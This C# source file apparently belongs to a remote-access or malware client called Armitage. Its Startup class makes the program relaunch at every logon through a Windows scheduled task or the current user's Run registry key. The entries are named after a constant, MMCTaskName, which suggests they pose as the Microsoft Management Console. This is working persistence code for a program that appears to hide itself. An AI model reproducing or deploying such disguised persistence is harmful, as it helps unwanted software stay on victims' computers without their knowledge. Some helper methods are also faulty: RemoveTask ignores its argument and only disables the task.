using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A class containing methods to attach itself at startup.
    /// </summary>
    public static class Startup
    {
        private static RegistryKey RegistryStartupFolder =
            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        /// <param name="filepath">If null, uses current process' file path.</param>
        public static bool ViaTaskScheduler(string name, string filepath = null)
        {
            try
            {
                if (filepath is null) filepath = Constants.MyPath;
                if (!IsTaskExists(name))
                    TaskService.Instance.AddTask(name, QuickTriggerType.Logon, filepath);
                else // replace
                {
                    // we're supposed to replace the task here with the new
                    // path but wtf 
                }
            }
            catch
            {
                return false;
            }
            return true;
        }
        public static bool ViaRegistry()
        {
            try
            {
                RegistryStartupFolder.SetValue(Constants.MMCTaskName,
                    Constants.MyPath);
                RegistryStartupFolder.Flush();
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            return false;
        }

        public static bool RemoveOldRegistryStartupKey()
        {
            try
            {
                RegistryStartupFolder.DeleteValue(Constants.MMCTaskName,
                    false);
                RegistryStartupFolder.Flush();
                return true;
            }
            catch
            {

            }
            return false;
        }
        public static bool IsOldStartupExist()
        {
            return RegistryStartupFolder.GetValue(Constants.MMCTaskName) != null;
        }
        public static bool IsTaskExists(string taskname)
        {
            return TaskService.Instance.GetTask(taskname) != null;
        }
        public static bool RemoveTask(string name)
        {
            try
            {
                TaskService.Instance.GetTask(Constants.MMCTaskName).Enabled = false;
                return true;
            }
            catch
            {
            }
            return false;
        }
    }
}
